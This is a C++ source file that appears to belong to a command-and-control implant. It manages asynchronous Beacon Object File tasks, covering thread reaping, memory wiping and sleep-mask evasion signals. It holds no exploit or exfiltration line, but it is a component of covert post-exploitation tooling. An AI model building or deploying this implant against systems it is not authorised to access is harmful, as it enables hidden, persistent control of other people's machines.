/*
 * async_bof_manager.cpp - Async BOF State Manager
 *
 * Manages long-running BOF tasks including:
 * - Task state tracking
 * - Reap cycle (cleanup of completed/timeout tasks)
 * - Command dispatch
 * - Output collection
 */

#include <windows.h>
#include <stdint.h>
#include <stdbool.h>

#include "../../include/coff/COFFSetup.h"
#include "../../include/utils.h"
#include "../../libs/bastia/bastia.h"
#include "../../include/coff/coff_loader.h"
#include "../../include/network/net_abstract.h"
#include "../../include/pandragon_runtime.h"

AsyncBofManager& AsyncBofManager::instance() {
    static AsyncBofManager s_instance;
    return s_instance; // maybe best to use a global...?
}

uint64_t AsyncBofManager::getTimeMs() {
    functionTable* nt = coff_loader_get_nt_func_table();
    return WinUtils::getCurrentUnixTime(nt);
}

uint64_t AsyncBofManager::getCurrentTimeMs() {
    return getTimeMs();
}

async_bof_state* AsyncBofManager::alloc() {
    async_bof_state* state = (async_bof_state*)__malloc(sizeof(async_bof_state));
    if (!state) return nullptr;

    state->task_id = __sync_add_and_fetch(&m_nextTaskId, 1);
    state->last_checkin = getTimeMs();
    state->flags = 0;
    state->channel = nullptr;
    state->channel_size = 0;
    state->handle = nullptr;
    state->threadCtx = nullptr;

    return state;
}

void AsyncBofManager::free(async_bof_state* state) {
    if (!state) return;

    if (state->channel) {
        crypto_wipe(state->channel, state->channel_size);
        __free(state->channel);
    }

    /* Clear async channel if this BOF owned it */
    PandragonRuntime& runtime = PandragonRuntime::getInstance();
    if (runtime.getAsyncChannel() == state->channel) {
        runtime.setAsyncChannel(NULL);
    }

    crypto_wipe(state, sizeof(async_bof_state));
    __free(state);
}

void AsyncBofManager::insert(async_bof_state* state) {
    if (!state) return;

    state->prev = m_tail;
    state->next = nullptr;

    if (m_tail) {
        m_tail->next = state;
    } else {
        m_head = state;
    }

    m_tail = state;
}

void AsyncBofManager::remove(async_bof_state* state) {
    if (!state) return;

    if (state->prev) {
        state->prev->next = state->next;
    } else {
        m_head = state->next;
    }

    if (state->next) {
        state->next->prev = state->prev;
    } else {
        m_tail = state->prev;
    }

    AsyncBofManager::free(state);
}

async_bof_state* AsyncBofManager::find(uint32_t task_id) {
    async_bof_state* cur = m_head;
    while (cur) {
        if (cur->task_id == task_id) return cur;
        cur = cur->next;
    }
    return nullptr;
}

void AsyncBofManager::reapCycle() {
    functionTable* nt = coff_loader_get_nt_func_table();
    if(!nt) {
        return;
    }
    uint64_t now = getTimeMs();
    async_bof_state* cur = m_head;
    async_bof_state* next;

    while (cur) {
        next = cur->next;

        if (cur->bof_class == BOF_CLASS_BLOCKING) {
            cur = next;
            continue;
        }

        if (cur->handle && cur->threadCtx) {
            async_bof_thread_ctx* threadCtx = (async_bof_thread_ctx*)cur->threadCtx;
            if (threadCtx->completed) {
                c_debugPrint(nt, "[BOF_REAP] Task %u completed with exit code %d", cur->task_id, threadCtx->exitCode);

                // Wait for thread to fully exit before freeing its context
                nt->NtWaitForSingleObject(cur->handle, FALSE, NULL);

                CleanupCOFF(threadCtx->ctx);
                __free(threadCtx->ctx);
                __free(threadCtx);

                if (cur->handle) {
                    nt->NtClose(cur->handle);
                    cur->handle = NULL;
                }
                cur->threadCtx = NULL;

                remove(cur);
                cur = next;
                continue;
            }
        }

        bool timed_out = (now - cur->last_checkin) > 120000;

        if (cur->channel) {
            bof_channel* ch = cur->channel;

            /* Acquire beacon_writing oplock (same protocol as main loop) */
            while (_InterlockedCompareExchange(&ch->beacon_writing, 1, 0) != 0) { }
            while (ch->bof_writing) { }

            if (ch->data_valid && !ch->data_acked) {
                if (timed_out) {
                    c_debugPrint(nt, "[BOF_REAP] Task %u died before ack, force reaping", cur->task_id);
                    ch->data_acked = 1;
                    ch->data_valid = 0;
                    if (cur->handle) {
                        nt->NtTerminateThread(cur->handle, 0);
                        nt->NtClose(cur->handle);
                        cur->handle = NULL;
                    }
                    if (cur->threadCtx) {
                        async_bof_thread_ctx* threadCtx = (async_bof_thread_ctx*)cur->threadCtx;
                        CleanupCOFF(threadCtx->ctx);
                        __free(threadCtx->ctx);
                        __free(threadCtx);
                        cur->threadCtx = NULL;
                    }
                    _InterlockedExchange(&ch->beacon_writing, 0);
                    remove(cur);
                    cur = next;
                    continue;
                }
            } else if (ch->data_valid && ch->data_acked) {
                if (timed_out) {
                    c_debugPrint(nt, "[BOF_REAP] Task %u stuck post-ack, aborting", cur->task_id);
                    _InterlockedExchange(&ch->beacon_writing, 0);
                    if (cur->handle) {
                        nt->NtClose(cur->handle);
                        cur->handle = NULL;
                    }
                    remove(cur);
                    cur = next;
                    continue;
                }
            } else if (timed_out) {
                _InterlockedExchange(&ch->beacon_writing, 0);
                if (cur->handle) {
                    nt->NtClose(cur->handle);
                    cur->handle = NULL;
                }
                remove(cur);
                cur = next;
                continue;
            }

            _InterlockedExchange(&ch->beacon_writing, 0);
        } else if (timed_out) {
            if (cur->handle) {
                c_debugPrint(nt, "[BOF_REAP] Task %u timed out, terminating", cur->task_id);
                nt->NtTerminateThread(cur->handle, 0);
                nt->NtClose(cur->handle);
                cur->handle = NULL;
            }
            if (cur->threadCtx) {
                async_bof_thread_ctx* threadCtx = (async_bof_thread_ctx*)cur->threadCtx;
                CleanupCOFF(threadCtx->ctx);
                __free(threadCtx->ctx);
                __free(threadCtx);
                cur->threadCtx = NULL;
            }
            remove(cur);
        }

        cur = next;
    }
}

void AsyncBofManager::dispatchCommands() {
    async_bof_state* cur = m_head;
    while (cur) {
        if (cur->bof_class != BOF_CLASS_LONG_RUNNING || !cur->channel) {
            cur = cur->next;
            continue;
        }

        bof_channel* ch = cur->channel;
        if (ch->signal_ack == 1) {
            ch->signal = 0;
            ch->signal_ack = 0;
        }

        /* Handle async BOF -> Sleep Mask integration signals */
        if (ch->signal == CHANNEL_SIGNAL_FORCE_SLEEP) {
            /* Store requested sleep duration in async_state for main loop to use */
            cur->requested_sleep_sec = ch->record_type;
            ch->signal_ack = 1;  /* Acknowledge - main loop will act on requested_sleep_sec */
            g_debugPrint("[AsyncBofMgr] Task %u requested FORCE_SLEEP for %u sec", cur->task_id, cur->requested_sleep_sec);
        } else if (ch->signal == CHANNEL_SIGNAL_WAKEUP_SEND) {
            /* BOF wants us to wake up, flush output, and re-enter sleep mask */
            ch->signal_ack = 1;
            g_debugPrint("[AsyncBofMgr] Task %u requested WAKEUP_SEND", cur->task_id);
        } else if (ch->signal == CHANNEL_SIGNAL_WAKEUP_EXIT) {
            /* BOF is done - beacon should wake up and restore main loop */
            ch->signal_ack = 1;
            g_debugPrint("[AsyncBofMgr] Task %u requested WAKEUP_EXIT", cur->task_id);
        }

        cur = cur->next;
    }
}

